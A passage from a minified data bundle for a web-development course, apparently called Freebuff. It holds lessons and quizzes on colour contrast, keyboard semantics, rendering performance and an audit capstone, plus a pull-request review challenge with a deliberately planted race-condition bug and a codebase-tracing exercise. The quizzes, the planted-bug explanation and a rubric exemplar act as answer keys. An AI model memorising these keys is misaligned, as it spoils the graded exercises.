bg-white">
  <section class="hero px-6 py-20 text-center">
    <p class="text-sm uppercase tracking-widest text-slate-500">v2.0</p>
    <h1 class="mt-4 text-4xl font-bold text-slate-400">Ship faster with Freebuff</h1>
    <p class="mx-auto mt-4 max-w-xl text-slate-400">A hands-on curriculum that grades what you actually run, not what you memorize.</p>
    <button class="mt-8 rounded-lg bg-indigo-300 px-6 py-3 font-semibold text-white shadow-sm">Start free</button>
  </section>
</main>`,requires:["h1.text-slate-900","p.text-slate-700","button.bg-indigo-600"]},body:`**Contrast is the accessibility rule with the clearest math.** WCAG defines a contrast ratio between 1:1 and 21:1 from the *relative luminance* of the two colors:

\`\`\`
ratio = (L_lighter + 0.05) / (L_darker + 0.05)
\`\`\`

**The thresholds you must know by heart:**

| Content | Level AA | Level AAA |
| --- | --- | --- |
| Body text (< 24px / < 18.66px bold) | **4.5:1** | 7:1 |
| Large text (≥ 24px, or ≥ 18.66px bold) | **3:1** | 4.5:1 |
| UI components & focus indicators | **3:1** | — |

\`\`\`js
// Relative luminance, sRGB channel-wise:
const lin = (c) => { c /= 255; return c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4; };
const lum = ([r, g, b]) => 0.2126 * lin(r) + 0.7152 * lin(g) + 0.0722 * lin(b);
const ratio = (fg, bg) => {
  const [a, b] = [lum(fg), lum(bg)].sort((x, y) => y - x);
  return (a + 0.05) / (b + 0.05);
};
ratio([255, 255, 255], [129, 140, 248]); // ≈ 2.9 — white on indigo-400 FAILS
ratio([255, 255, 255], [79, 70, 229]);   // ≈ 6.3 — white on indigo-600 passes
\`\`\`

**That's exactly the bug in this preview**: \`text-slate-400\` on white is ~3.1:1 — pretty in a mockup, illegible on a phone in sunlight. \`text-slate-900\` is 17+:1. The button's \`bg-indigo-300\` with white text sits near 1.9:1; \`bg-indigo-600\` clears AA comfortably.

**Where teams get contrast wrong:**

- **Placeholder text** at gray-300 — it's content, it gets read.
- **Placeholders *as labels*** — also an ARIA failure; keep a real \`<label>\`.
- **Opacity-faded disabled states** — disabled controls are exempt from contrast minimums, but if users must read them, they still need to be legible.
- **Gradients** — grade the *worst* point a glyph can land on, not the average.
- **Placeholder images with text baked in** — same math applies.

**Grade it in CI or in the browser**: Lighthouse flags it, axe DevTools pinpoints the node, and the DevTools color picker shows any two colors' ratio while you tweak.`,quiz:[{q:"WCAG AA requires body text to reach…",options:["3:1","4.5:1","7:1","2:1"],answer:1,explanation:"4.5:1 for normal text, 3:1 for large text (24px+, or 18.66px+ bold). 7:1 is the stricter AAA level for body copy."},{q:"Large text (≥ 24px) may pass AA at…",options:["3:1","4.5:1","7:1","It has no exemption"],answer:0,explanation:"Big text is easier to read at lower contrast, so the requirement relaxes to 3:1 — still well above decorative gray-on-white."},{q:"White text on #818cf8 (indigo-400) is about 2.9:1. The right fix is…",options:["Lower the font size","Darken the background (e.g. indigo-600) or use dark text on the light background","Add a shadow","Nothing — it's a button, so exempt"],answer:1,explanation:"Buttons are UI + text: the fix is color, not tricks. Shadows don't reliably count toward the measured ratio; exempted cases are rare."},{q:"The contrast ratio is computed from…",options:["Hue distance","Relative luminance of each color: (L1 + 0.05) / (L2 + 0.05)","Average RGB values","Pixel count on screen"],answer:1,explanation:"Luminance maps sRGB channels to perceived light, linearized first. The +0.05 terms keep pure black from dividing by zero."},{q:"Which is ALSO an accessibility failure, not just a contrast issue?",options:["Using <label> for every input","Using the placeholder attribute as the only input label","Dark mode support","WebP images"],answer:1,explanation:"Placeholders vanish on input, fail to associate programmatically, and are usually too low-contrast anyway. Keep a real <label>."}]},{id:"keyboard-focus",title:"Keyboard & Semantics: Real Elements Win",minutes:12,preview:{brief:"The nav is three clickable divs and there's no way past it — tab users get lost before the content starts. Replace the lookalikes with real elements.",goal:'Convert the three .link divs into <a> anchors with their hrefs, give the <main> element id="main", and add a skip link as the first element of <body>: <a class="skip" href="#main">Skip to content</a>.',html:`<body class="min-h-screen bg-slate-50 font-sans text-slate-900">
  <nav class="flex gap-6 border-b bg-white px-6 py-4 shadow-sm">
    <div class="link cursor-pointer font-medium hover:text-indigo-600" onclick="location.hash='#home'">Home</div>
    <div class="link cursor-pointer font-medium hover:text-indigo-600" onclick="location.hash='#docs'">Docs</div>
    <div class="link cursor-pointer font-medium hover:text-indigo-600" onclick="location.hash='#pricing'">Pricing</div>
  </nav>
  <main class="mx-auto max-w-3xl px-6 py-16">
    <h1 class="text-3xl font-bold">Focus is a first-class input</h1>
    <p class="mt-4 text-slate-600">If it can be clicked, it can be tabbed — make sure it actually can.</p>
  </main>
</body>`,requires:["main#main",'a.skip[href="#main"]',"nav a[href]"]},body:'**A div with an onclick is a button cosplay.** It looks right with a mouse and is invisible to everyone else: no Tab stop, no Enter/Space activation, no role in the accessibility tree, no default focus behavior. The browser ships all of that for free — in `<button>` and `<a href>`.\n\n```html\n<!-- lookalike: not focusable, not announced, no keyboard activation -->\n<div class="link" onclick="go()">Docs</div>\n\n<!-- real: focusable, announced as "link", Enter activates, browser handles the rest -->\n<a href="/docs">Docs</a>\n```\n\n**The landmark & skip-link pattern.** On every page, a keyboard user\'s first Tab should offer "skip to main" — otherwise they re-traverse your entire nav on every page:\n\n```html\n<body>\n  <a class="skip" href="#main">Skip to content</a>\n  <nav>…</nav>\n  <main id="main">…</main>\n</body>\n```\n\n**Focus visibility is not optional.** `outline: none` with nothing in its place is the single most common accessibility regression in hand-rolled CSS. Style the *keyboard-only* ring so mouse users aren\'t annoyed:\n\n```css\n:focus-visible { outline: 2px solid indigo; outline-offset: 2px; }\n```\n\n**The tabindex rules that keep you out of trouble:**\n\n- `tabindex="0"` — join the natural tab order (only for things you\'ve made widget-like).\n- `tabindex="-1"` — programmatically focusable (perfect for the skip-link *target*).\n- **Positive values (`tabindex="5"`) — never.** They hijack the document order and create exactly the confusion you were trying to avoid.\n\n**Names, roles, values.** An icon-only button needs an accessible name: `aria-label="Close dialog"` or visually-hidden text. A custom dropdown needs `role` + `aria-expanded`. But reach for native elements first — <button>, <a>, <label>, <details> — and most of the ARIA disappears.',quiz:[{q:"Why is <a href> the right element for nav items?",options:["It renders faster than a div","It's focusable, announced as a link, activated by Enter, and supports browser affordances like middle-click and copy link","It's the only element CSS can style","It is required by HTML validation"],answer:1,explanation:"Semantics come with the element: role, keyboard activation, and every browser feature keyed to links. A div gets none of it."},{q:"Removing outline: none without a replacement…",options:["Has no effect on accessibility","Leaves keyboard users with no indication of focus — the most common a11y regression","Speeds up rendering","Is required for dark mode"],answer:1,explanation:"The focus ring IS the pointer for keyboard users. Use :focus-visible so the ring appears for keyboards without following the mouse."},{q:'tabindex="5" on a footer link is…',options:["Good — it makes it important","Harmful — positive values override the document's natural tab order and scramble navigation","Required for footers",'The same as tabindex="0"'],answer:1,explanation:"Positive tabindex values jump that element ahead of everything with a lower number, creating a tab order nobody can predict. Use 0 or -1."},{q:"The skip link's target should get…",options:[`tabindex="-1" (if it isn't naturally focusable) so focus actually lands inside <main>`,'tabindex="100"',"autofocus",'role="button"'],answer:0,explanation:'Clicking an in-page link moves the *viewport*, but keyboard focus can stop short on older engines — tabindex="-1" guarantees focus lands on the region.'},{q:"An icon-only close button with no text needs…",options:["title attribute only",'an accessible name — aria-label="Close" or visually hidden text',"A tooltip","Nothing, icons are universal"],answer:1,explanation:"Screen readers announce the accessible name; an empty button announces as 'button'. aria-label is the standard fix."}]},{id:"critical-rendering",title:"The Rendering Path: Reflow, Repaint, Restyle",minutes:12,reading:!0,sort:{prompt:"Order the critical rendering path, from typing the URL to pixels on screen.",items:["DNS lookup resolves the host","TCP handshake + TLS negotiate the connection","HTML arrives; the parser builds the DOM","CSSOM and DOM combine into the render tree","Layout computes geometry, paint fills the pixels"],explanation:"Network first, then parse, then style+layout+paint. Anything render-blocking (sync CSS or JS before the fold) stalls step 4 — which is why defer/async and small CSS move the needle."},body:"**Every frame, the browser runs a pipeline — and only some of it is avoidable:**\n\n```\nstyle  →  layout (reflow)  →  paint  →  composite\n```\n\n- **Reflow** recalculates geometry — the expensive one. Touch a layout property (`width`, `top`, `margin`, `font-size`) and every dependent box is re-measured.\n- **Repaint** rasterizes pixels — cheaper, but still work.\n- **Composite** moves pre-rendered layers with the GPU — cheapest, and the *only* stage that runs at 60fps without touching layout.\n\n**This is why `transform` and `opacity` animate smoothly and `top`/`margin` do not:**\n\n```css\n.card { transition: transform .2s; }        /* composited — GPU layer, no reflow */\n.card:hover { transform: translateY(-4px); }\n\n.card-bad { transition: top .2s; }          /* reflows EVERY frame */\n.card-bad:hover { top: 4px; }\n```\n\n**Render-blocking resources stall the whole pipeline.** A sync `<script>` in `<head>` halts parsing; a `<link rel=\"stylesheet\">` blocks the first paint until the CSS downloads. The fixes are canonical:\n\n```html\n<script src=\"app.js\" defer><\/script>   <!-- runs after parsing, in order — the default you want -->\n<script src=\"analytics.js\" async><\/script> <!-- runs whenever; breaks document order -->\n```\n\n- **`defer`** for your app scripts (order preserved, DOM ready).\n- **`async`** only for independent one-offs like analytics.\n- **`font-display: swap`** so text paints in a fallback instead of staying invisible.\n- **Code-split** at route boundaries: the user downloads this route, not the whole app.\n\n** `will-change: transform` promises a layer — keep the promise short.** It tells the browser to promote an element to its own composited layer *early*. That's the fix for one-off janky transitions; applied to 50 elements at once it's a memory leak with a GPU bill. Set it right before the animation, remove it after — or better, let the browser decide.\n\n**Measure, don't guess.** The Performance panel's flame chart shows exactly which frames reflowed. And honor motion preferences while you're in there:\n\n```css\n@media (prefers-reduced-motion: reduce) {\n  * { animation-duration: .01ms !important; transition-duration: .01ms !important; }\n}\n```\n\nVestibular disorders make large parallax and slide transitions genuinely painful. One media query is the whole accommodation — the next lesson's capstone puts it on a real button.",quiz:[{q:"Which script tag preserves document order and waits for the DOM?",options:["async","defer","Neither — both are identical",'type="module" blocks parsing'],answer:1,explanation:"defer runs after the document is parsed, in insertion order. async runs the moment the file arrives, in whatever order that happens."},{q:"Animating `top: 0 → 100px` is janky because it…",options:["Triggers style recalculation and layout on every frame (reflow)","Only repaints one pixel","Uses the GPU automatically","Is blocked by the network"],answer:0,explanation:"top is a layout property: each frame re-measures geometry, then repaints. transform moves a pre-composited layer instead — one cheap stage."},{q:"CSS in <head> blocks first paint because…",options:["CSS is executed like JavaScript","The browser won't render content it might have to restyle — it waits for the rules","Stylesheets download slower than HTML by spec","It doesn't — CSS never blocks rendering"],answer:1,explanation:"Rendering without complete styles guarantees a visible flash of unstyled content. The browser stalls first paint until the CSS arrives — keep it small and critical-path only."},{q:"font-display: swap mainly improves…",options:["CLS only","Perceived load — text paints immediately in the fallback instead of staying invisible","Bundle size","Security"],answer:1,explanation:"The default (font-display: auto/block) can hide text for seconds while the webfont downloads. swap shows fallback text now and upgrades in place."},{q:"will-change: transform on every list item…",options:["Is the recommended default","Promotes dozens of layers — memory/GPU cost that outweighs the win; reserve it for elements actively animating","Removes the need for transforms","Disables compositing"],answer:1,explanation:"Each promoted layer costs memory and bookkeeping. Use it surgically around an animation, or drop it entirely and let the browser promote what it must."}]},{id:"capstone-audit",title:"Capstone: The Performance & A11y Audit",minutes:20,preview:{brief:"One page, four regressions shipped together — CLS, contrast, keyboard traps, and motion sickness. Audit it the way you would a PR and fix all four.",goal:'1) Give the hero img width="640" height="360" plus descriptive alt. 2) h1 → text-slate-900, the intro p → text-slate-700, the button → bg-indigo-600. 3) Convert the nav divs to <a> anchors, add id="main" to <main>, and prepend <a class="skip" href="#main">Skip to content</a> to <body>. 4) Add class motion-reduce:animate-none to the bouncing .cta button.',html:`<body class="min-h-screen bg-white font-sans text-slate-900">
  <nav class="flex gap-6 border-b bg-white px-6 py-4">
    <div class="link font-medium" onclick="location.hash='#product'">Product</div>
    <div class="link font-medium" onclick="location.hash='#pricing'">Pricing</div>
    <div class="link font-medium" onclick="location.hash='#login'">Log in</div>
  </nav>
  <main class="mx-auto max-w-3xl px-6 py-14">
    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 640 360'%3E%3Crect width='640' height='360' fill='%23e2e8f0'/%3E%3Ctext x='50%25' y='50%25' font-family='monospace' font-size='18' text-anchor='middle' fill='%2364748b'%3Edashboard%3C/text%3E%3C/svg%3E" class="mt-6 w-full rounded-xl">
    <h1 class="mt-8 text-4xl font-bold text-slate-400">Your dashboard, minus the guesswork</h1>
    <p class="mt-4 text-slate-400">See every deploy, every metric, and every regression in one place — before your users tweet about it.</p>
    <button class="cta mt-8 animate-bounce rounded-lg bg-indigo-300 px-6 py-3 font-semibold text-white">Start free trial</button>
  </main>
</body>`,requires:["img[width][height]","img[alt]","h1.text-slate-900","p.text-slate-700","button.bg-indigo-600","main#main",'a.skip[href="#main"]',"nav a[href]","button.motion-reduce\\:animate-none"]},body:'The capstone is an audit, exactly like a real review: **read the page, find every class of regression, and fix each one at the structural level.** Grading checks the finished markup against all nine selectors — four lessons\' worth of rules on one screen.\n\n**1 · Layout stability (CLS).** The hero `<img>` has no `width`/`height`, so its box reserves zero pixels until the SVG arrives — everything below jumps. The fix from lesson two: intrinsic dimensions *and* an `alt` that describes the dashboard screenshot for anyone who can\'t see it.\n\n**2 · Contrast (WCAG AA).** `text-slate-400` on white is ~3.1:1 — under the 4.5:1 bar for body copy and under even the 3:1 large-text bar. The h1 goes to `text-slate-900` (17:1), the intro to `text-slate-700` (~10:1), and the CTA\'s `bg-indigo-300` (white text ≈ 1.9:1) to `bg-indigo-600` (≈ 6.3:1). Check the math if you don\'t trust it — it\'s in lesson three.\n\n**3 · Keyboard & semantics.** Three `<div onclick>` lookalikes: not focusable, not announced, no Enter/Space. Make them `<a href="#…">`. Give `<main>` an `id="main"`, and prepend the skip link so the *first* Tab on the page jumps past the nav.\n\n**4 · Motion.** `animate-bounce` on the primary CTA is decorative by nature — which makes it exactly the thing `prefers-reduced-motion` exists to suppress:\n\n```html\n<button class="cta animate-bounce motion-reduce:animate-none …">Start free trial</button>\n```\n\nTailwind\'s `motion-reduce:` variant compiles to the `prefers-reduced-motion` media query — one class, and users who asked their OS for less motion stop being bounced at.\n\n**Why all four on one page?** Because that\'s how they ship in production: nobody deploys a "contrast feature." The audit habit — structure, then contrast, then keyboard, then motion — is the deliverable. Run it on every PR and the complaints never arrive.',quiz:[{q:"The single highest-impact CLS fix on this page is…",options:["Adding width and height to the hero <img>","Renaming the .cta class","Moving <nav> after <main>","Removing the SVG"],answer:0,explanation:"Undimensioned media before the fold is the classic shift source: reserve the box in the HTML and everything below it stays put."},{q:"The CTA's white text on bg-indigo-300 fails AA because…",options:["The font is too small only","It measures ~1.9:1 — far below the 4.5:1 required for normal-size text","Buttons are judged at 7:1","Indigo is not a valid color"],answer:1,explanation:"Contrast is a ratio, not a vibe: white on indigo-300 is under 2:1. bg-indigo-600 (~6.3:1) clears AA with room to spare."},{q:"The three nav divs are broken for keyboard users because they…",options:["Have the wrong color","Are not focusable and have no link role or Enter-key activation","Are inside <nav>","Use onclick"],answer:1,explanation:"A div is a generic box: no tab stop, no role, no key handling. Anchors restore all three plus browser affordances."},{q:"motion-reduce:animate-none works by…",options:["Deleting the animation at build time","Compiling to @media (prefers-reduced-motion: reduce), suppressing the bounce for users who requested it","Disabling all CSS animations globally","Only pausing on mobile devices"],answer:1,explanation:"It's a variant prefix — same mechanism as hover:. The request comes from the OS accessibility setting, scoped to this one utility."},{q:"The skip link only does its job if…",options:["It is the first focusable element and #main exists as the target","It is styled hidden from everyone","It sits after the nav","It uses a JavaScript scroll handler"],answer:0,explanation:"First in DOM order means it's the first Tab stop; a matching id means focus and viewport both land in the content. No JS required."}]}]},VP=[{id:"agent-pr-search-race",title:"The PR That Lost Its Guard",brief:"Add debounced product search to the navbar — closes #482. Tested locally, feels much snappier.",files:[{path:"src/hooks/useProductSearch.ts",before:`import { useEffect, useState } from "react";
import { searchProducts, type Product } from "../lib/searchCache";

export function useProductSearch(query: string) {
  const [results, setResults] = useState<Product[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!query) {
      setResults([]);
      return;
    }
    let cancelled = false;
    setLoading(true);
    searchProducts(query).then((products) => {
      if (cancelled) return;
      setResults(products);
      setLoading(false);
    });
    return () => {
      cancelled = true;
    };
  }, [query]);

  return { results, loading };
}`,after:`import { useEffect, useState } from "react";
import { searchProducts, type Product } from "../lib/searchCache";
import { useDebounced } from "../lib/debounce";

export function useProductSearch(query: string) {
  const debounced = useDebounced(query, 250);
  const [results, setResults] = useState<Product[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!debounced) {
      setResults([]);
      return;
    }
    setLoading(true);
    console.log("[search]", debounced);
    searchProducts(debounced).then((products) => {
      setResults(products);
      setLoading(false);
    });
  }, [debounced]);

  return { results, loading };
}`},{path:"src/lib/debounce.ts",after:`import { useEffect, useState } from "react";

/** Returns \`value\` only after it has stopped changing for \`delay\` ms. */
export function useDebounced<T>(value: T, delay: number): T {
  const [settled, setSettled] = useState(value);

  useEffect(() => {
    const timer = setTimeout(() => setSettled(value), delay);
    return () => clearTimeout(timer);
  }, [value, delay]);

  return settled;
}

/** Plain function form, for non-React call sites. */
export function debounce<A extends unknown[]>(fn: (...args: A) => void, delay: number) {
  let timer: ReturnType<typeof setTimeout> | null = null;
  return (...args: A) => {
    if (timer) clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}`},{path:"src/components/SearchBox.tsx",before:`import { useState } from "react";
import { useProductSearch } from "../hooks/useProductSearch";

export function SearchBox() {
  const [query, setQuery] = useState("");
  const { results, loading } = useProductSearch(query);

  return (
    <div className="search-box">
      <input
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        placeholder="Search products…"
      />
      {loading && <span className="search-box__hint">searching…</span>}
      <ul className="search-box__results">
        {results.map((product) => (
          <li key={product.id}>{product.name}</li>
        ))}
      </ul>
    </div>
  );
}`,after:`import { useState } from "react";
import { useProductSearch } from "../hooks/useProductSearch";

export function SearchBox() {
  const [query, setQuery] = useState("");
  const { results, loading } = useProductSearch(query);

  return (
    <div className="search-box">
      <input
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        placeholder="Search products…"
        aria-label="Search products"
      />
      {loading && <span className="search-box__hint">searching…</span>}
      <ul className="search-box__results">
        {results.map((product) => (
          <li key={product.id}>{product.name}</li>
        ))}
      </ul>
    </div>
  );
}`},{path:"src/lib/searchCache.ts",before:`export type Product = { id: number; name: string; priceCents: number };

/** Simulated search endpoint: variable latency, deterministic per query. */
export async function searchProducts(query: string): Promise<Product[]> {
  const latency = 40 + (query.length % 3) * 60;
  await new Promise((resolve) => setTimeout(resolve, latency));

  return [
    { id: 1, name: query + " tote", priceCents: 1800 },
    { id: 2, name: query + " mug", priceCents: 1200 },
  ];
}`,after:`export type Product = { id: number; name: string; priceCents: number };

const CACHE_TTL_MS = 30_000;
const cache = new Map<string, { at: number; items: Product[] }>();

/** Simulated search endpoint: variable latency, deterministic per query. */
export async function searchProducts(query: string): Promise<Product[]> {
  const hit = cache.get(query);
  if (hit && Date.now() - hit.at < CACHE_TTL_MS) return hit.items;

  const latency = 40 + (query.length % 3) * 60;
  await new Promise((resolve) => setTimeout(resolve, latency));

  const items = [
    { id: 1, name: query + " tote", priceCents: 1800 },
    { id: 2, name: query + " mug", priceCents: 1200 },
  ];
  cache.set(query, { at: Date.now(), items });
  return items;
}`},{path:"package.json",before:`{
  "name": "shop-ui",
  "dependencies": {
    "react": "^18.3.1"
  },
  "devDependencies": {
    "@types/react": "^18.3.12",
    "typescript": "^5.6.3",
    "vite": "^5.4.10"
  }
}`,after:`{
  "name": "shop-ui",
  "dependencies": {
    "react": "^18.3.1"
  },
  "devDependencies": {
    "@types/react": "^18.3.12",
    "typescript": "^5.6.3",
    "vite": "^5.4.11"
  }
}`}],planted:{file:"src/hooks/useProductSearch.ts",line:17,category:"RC",why:"The refactor replaced the cancelled-flag cleanup with a debounce but dropped the staleness guard. When two searches are in flight and the older response lands last, it overwrites the newer one — the UI shows results for text the user has already moved past. Keep a request id (or an AbortController) and ignore every response that isn't the newest."},distractors:["The console.log left in src/hooks/useProductSearch.ts — noisy, but it logs the query the user typed, not anything private. A nit, not a blocker.","The vite patch bump in package.json — unrelated housekeeping, but harmless and correct.","The aria-label added in src/components/SearchBox.tsx — accessibility polish the PR mentions; correct."],hints:[{tier:1,text:"Two quick searches can finish out of order. Which line lets an older response become state?"},{tier:2,text:"The effect in useProductSearch.ts no longer binds a response to the query that requested it. The before-file had a cancelled flag — find what replaced it."},{tier:3,text:"The defect is the line that applies the response without checking it is still the latest request. Guard with a request id (or an AbortController) and drop everything else."}]}],WP=new Map(VP.map(e=>[e.id,e]));function UP(e){const t=WP.get(e);if(!t)throw new Error(`Unknown diff challenge "${e}" — add it to src/data/diff-challenges.ts`);return t}const zP={id:"shop-api",title:"Codebase Archaeology: A Shop API You've Never Seen",brief:"Six files, one request path. Trace it directly — an agent will happily draw you a confident, wrong map; yours has to be checkable.",files:[{path:"server.ts",content:`import express from "express";
import { ordersRouter } from "./src/routes/orders";

export function createServer() {
  const app = express();
  app.use(express.json());
  app.use("/orders", ordersRouter);
  return app;
}`},{path:"src/routes/orders.ts",content:`import { Router } from "express";
import { formatPrice } from "../lib/money";
import { findOrder, listOrders as listOrderRows } from "../db/orders";
import { markOrderPaid, summarize } from "../services/orders";

export const ordersRouter = Router();

// The route layer translates HTTP to function calls. It owns no rules.
ordersRouter.get("/", listOrders);
ordersRouter.get("/:id", getOrder);
ordersRouter.post("/:id/pay", payOrder);

async function listOrders(_req, res) {
  const rows = await listOrderRows();
  res.json(
    rows.map((order) => ({
      id: order.id,
      status: order.status,
      total: formatPrice(order.total),
    }))
  );
}

async function getOrder(req, res) {
  const order = await findOrder(Number(req.params.id));
  if (!order) return res.status(404).json({ error: "not found" });
  res.json(summarize(order));
}

async function payOrder(req, res) {
  await markOrderPaid(Number(req.params.id));
  res.json({ ok: true });
}`},{path:"src/services/orders.ts",content:`import { findOrder, updateOrderStatus } from "../db/orders";

/**
 * The business rule for payment: load the order, decide, then update.
 * Already-paid is a no-op; missing orders do nothing.
 */
export async function markOrderPaid(id: number) {
  const order = await findOrder(id);
  if (!order) return false;
  if (order.status === "paid") return true;
  return updateOrderStatus(id, "paid");
}

/** Shapes an order for the API. */
export function summarize(order: { id: number; status: string; total: number }) {
  return {
    id: order.id,
    status: order.status,
    totalCents: order.total,
  };
}`},{path:"src/db/orders.ts",content:`/** In-memory stand-in for the orders table. */
export async function listOrders() {
  return [
    { id: 101, status: "pending", total: 4599 },
    { id: 102, status: "paid", total: 1899 },
  ];
}

export async function findOrder(id: number) {
  const rows = await listOrders();
  return rows.find((row) => row.id === id) ?? null;
}

export async function updateOrderStatus(id: number, status: string) {
  if (!id) throw new Error("id required");
  return status === "paid";
}`},{path:"src/lib/money.ts",content:`/** Formats a cent amount for display. Currency-agnostic on purpose. */
export function formatPrice(cents: number): string {
  return "$" + (cents / 100).toFixed(2);
}`},{path:"workers/email.ts",content:`import { formatPrice } from "../lib/money";

/** Builds the receipt line sent after an order is paid. */
export function sendReceipt(order: { id: number; status: string; total: number }) {
  return "Order #" + order.id + " — " + formatPrice(order.total);
}`}],questions:[{kind:"locate",prompt:"POST /orders/:id/pay flips the order's status. Which function owns that rule — loads the order, decides, then updates?",choices:[{file:"server.ts",symbol:"createServer"},{file:"src/routes/orders.ts",symbol:"listOrders"},{file:"src/routes/orders.ts",symbol:"payOrder"},{file:"src/services/orders.ts",symbol:"markOrderPaid"},{file:"src/services/orders.ts",symbol:"summarize"},{file:"src/db/orders.ts",symbol:"listOrders"},{file:"src/db/orders.ts",symbol:"updateOrderStatus"},{file:"src/lib/money.ts",symbol:"formatPrice"},{file:"workers/email.ts",symbol:"sendReceipt"}],answer:{file:"src/services/orders.ts",symbol:"markOrderPaid"},why:"The route only delegates. markOrderPaid() loads the order, applies the rule (already paid is a no-op), and performs the update through the DB layer. Finding the layer that owns a rule — not the one that owns the URL — is the whole point of the trace."},{kind:"select",prompt:"Which code paths call formatPrice()? Select every true caller.",options:[{label:"src/routes/orders.ts → listOrders()",correct:!0},{label:"workers/email.ts → sendReceipt()",correct:!0},{label:"src/services/orders.ts → markOrderPaid()",correct:!1},{label:"src/lib/money.ts → formatPrice()",correct:!1},{label:"src/db/orders.ts → listOrders()",correct:!1}],why:"The listing route formats each row's total for the API response, and the receipt worker formats it for the email line. money.ts is the definition, not a caller — a grep hit that is not a call site. The service and the raw DB read never touch display formatting."},{kind:"select",prompt:"Order.total is about to be renamed amountCents. Which files must change in the same rename?",options:[{label:"server.ts",correct:!1},{label:"src/routes/orders.ts",correct:!0},{label:"src/services/orders.ts",correct:!0},{label:"src/db/orders.ts",correct:!0},{label:"src/lib/money.ts",correct:!1},{label:"workers/email.ts",correct:!0}],why:"Four files read or construct the field: the route formats it, the service summarizes it, the DB rows carry it, and the receipt worker formats it. server.ts only wires middleware; money.ts formats a cents number that could come from anywhere — it never names the field. That's a blast radius of four, not six."}]},$P=[zP];function HP(e){const t=$P.find(n=>n.id===e);if(!t)throw new Error(`Unknown repo snapshot "${e}" — add it to src/data/repo-snapshots.ts`);return t}const QP={id:"agents",title:"Working with Coding Agents",blurb:"Operate the tool: write specs an agent can execute, read unfamiliar code, manage context, approve plans, choose permissions, and verify what ships.",numeral:"ⅩⅥ",lessons:[{id:"specs-and-prompts",title:"Specs and Prompts: From Vague Task to Executable Spec",minutes:12,body:`An **executable spec** is a task an agent can finish without asking a single clarification question. It answers four things:

1. **Scope** — what exactly is included and, just as important, what is not.
2. **Acceptance criteria** — measurable statements a reviewer can check.
3. **Non-goals** — the changes that would look correct but are out of scope ("do not touch the billing copy").
4. **Definition of done** — how it gets verified: which test, which command, which observable behaviour.

Vague requests are not malicious — they're underspecified, and the agent fills the gaps with its best guess:

\`\`\`
✗ "make the dashboard faster"

✓ "Reduce the initial dashboard load. Scope: the overview route only.
   Acceptance: LCP under 2.0s on a throttled profile; /api/metrics request
   count must not increase. Non-goals: no visual redesign, no data-model
   changes. Done: the dashboard e2e + LCP budget tests pass."
\`\`\`

Writing the spec is also a design step for *you*: gaps you cannot fill in the spec ("faster than *what*?") are gaps the agent will fill for you — differently every session.`,quiz:[{q:"Which of these is an executable spec?",options:["Make the settings page nicer and faster.","Add dark mode to settings: toggle persisted in localStorage, applied through the existing theme hook; acceptance — reload keeps the choice, no flash on load; non-goal — do not restyle other pages.","Improve settings performance (target TBD).","Refactor the settings page for quality."],answer:1,explanation:"It names scope, acceptance criteria (persistence, no flash), and a non-goal. The others leave scope and verification to the agent's guess — every session a different guess."},{q:"Why does a non-goal belong in the spec?",options:["To make the prompt longer and more formal","Agents optimize for the goal and may helpfully expand scope; explicit non-goals prevent correct-looking, out-of-scope changes","Because the test suite requires one","To document the team's values"],answer:1,explanation:'"While I was there" changes are the most common scope bug in agent diffs. A non-goal is cheaper than a rejected pull request.'},{q:'Which addition turns "make it faster" into something verifiable?',options:["A deadline for the work","More implementation detail in the prompt","A measurement, a target or decision rule, and how it is checked","A note that the current performance is bad"],answer:2,explanation:'Verification needs three things: what is measured, what counts as success, and the check that decides. Without them, "faster" is an opinion.'}],rubric:{id:"spec-dashboard",title:"Spec the fastest dashboard",prompt:'Turn "make the dashboard faster" into an executable spec.',brief:"It must name what is measured, a target or decision rule, at least one non-goal, and a definition of done that includes verification.",minWords:70,criteria:[{id:"nonGoal",label:"Names at least one explicit non-goal or out-of-scope change",check:'output.includes("non-goal") || output.includes("non goal") || output.includes("out of scope")'},{id:"measure",label:"Names what is measured (a metric, budget, or profile)",check:'output.includes("measure") || output.includes("metric") || output.includes("lcp") || output.includes("p95") || output.includes("budget")'},{id:"done",label:"Definition of done includes verification (a test, command, or observable check)",check:'output.includes("test") || output.includes("verify") || output.includes("check") || output.includes("pass")'},{id:"target",label:"States a target or decision rule for the measurement"}],exemplar:`Reduce the initial load time of the dashboard overview route.

Measurement: LCP on the existing performance budget test, throttled profile.
Target: LCP at or below 2.0s, and no increase in /api/metrics request count.

Scope: the overview route and the widgets it renders.
Non-goals: no visual redesign, no data-model changes, no other routes.

Definition of done: the dashboard e2e suite passes, the LCP budget assertion is green, and the request-count test is unchanged.`}},{id:"codebase-archaeology",title:"Codebase Archaeology: Finding Where Things Live",minutes:14,body:`An agent will draw you a confident map of a repo it has never compiled. Someone has to verify that map — in month one, that someone is you.

**Read one request end to end.** Pick a single route and follow it: entry (server/router) → handler → rules/services → data → response. Name each hop and the file it lives in. One traced request teaches you more than an hour of scrolling.

**Hypothesis first, grep second.** Before searching, predict where things live — routes in \`routes/\`, domain rules near services, money math near the model. Then check. Being wrong cheaply is how you build the right mental model.

**Ask scoping questions that have answers:**
- *What else calls this function?* — answerable from the repo, not an opinion.
- *What breaks if I rename this field?* — a blast radius you can compute.
- *Which module owns this invariant?* — a layer question with one honest answer.

These work on the repo and on an agent's answer about the repo. The difference: an agent's answer is a draft. The repo is the source of truth.`,repo:HP("shop-api"),quiz:[{q:"You have just opened a repo you've never seen; a bug is reported in a path you don't know. What is the strongest first move?",options:["Grep for the error string first — search beats reading","Trace one request through the code end to end","Ask an agent to summarize the repository","Read the README and changelog cover to cover"],answer:1,explanation:"Tracing one real request builds an entry → handler → data model in minutes. Grep tells you where a string appears; a trace tells you how the system works."},{q:'What makes "What else calls this function?" a real question rather than a rhetorical one?',options:["It is answerable from the repository itself — call sites are evidence","It is a polite way to say the function is bad","It only applies to public APIs","An agent can answer it faster than a search"],answer:0,explanation:"Call sites, importers, and type usages are facts in the repo. The same question asked of an agent produces a draft answer that you then verify the same way."},{q:"A teammate plans to rename Order.total to amountCents. The blast-radius question is:",options:['"Is amountCents a better name?"','"How many lines does the rename touch?"','"Which files read or construct that field, and must change together?"','"Which service owns 